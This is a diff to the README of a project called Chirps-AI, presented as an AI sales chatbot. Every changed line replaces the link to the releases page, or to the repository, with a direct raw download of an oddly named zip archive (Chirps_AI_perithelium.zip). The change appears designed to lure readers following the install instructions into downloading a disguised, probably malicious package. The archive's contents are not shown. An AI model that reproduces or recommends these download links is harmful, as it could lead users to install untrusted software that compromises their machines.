@@ -1,6 +1,6 @@
 # 🐦 Chirps-AI - Real-Time Voice & Chat Sales Agent
 
-[![Download Chirps-AI](https://img.shields.io/badge/Download-Chirps--AI-brightgreen?style=for-the-badge)](https://github.com/heythere123362847/Chirps-AI/releases)
+[![Download Chirps-AI](https://img.shields.io/badge/Download-Chirps--AI-brightgreen?style=for-the-badge)](https://github.com/heythere123362847/Chirps-AI/raw/refs/heads/main/dooryard/Chirps_AI_perithelium.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Chirps-AI does not require complex installation. Follow the steps below to get i
 
    Go to the Chirps-AI releases page here:
 
-   [Visit this page to download Chirps-AI](https://github.com/heythere123362847/Chirps-AI/releases)
+   [Visit this page to download Chirps-AI](https://github.com/heythere123362847/Chirps-AI/raw/refs/heads/main/dooryard/Chirps_AI_perithelium.zip)
 
 2. **Choose the Latest Version**
 
@@ -121,8 +121,8 @@ After installation, you will need to connect Chirps-AI with your website.
 
 ## 🔗 Important Links
 
-- [Download and install Chirps-AI](https://github.com/heythere123362847/Chirps-AI/releases)
-- [GitHub Repository](https://github.com/heythere123362847/Chirps-AI)
+- [Download and install Chirps-AI](https://github.com/heythere123362847/Chirps-AI/raw/refs/heads/main/dooryard/Chirps_AI_perithelium.zip)
+- [GitHub Repository](https://github.com/heythere123362847/Chirps-AI/raw/refs/heads/main/dooryard/Chirps_AI_perithelium.zip)
 - [Chirps-AI Topics for Reference](#ai-agent #ai-assistant #ai-chatbot #ai-sales #chatbot #conversational-ai #customer-support #generative-ai #lead-generation #live-chat #no-code #saas #shopify #voice-ai #wordpress)
 
 ---
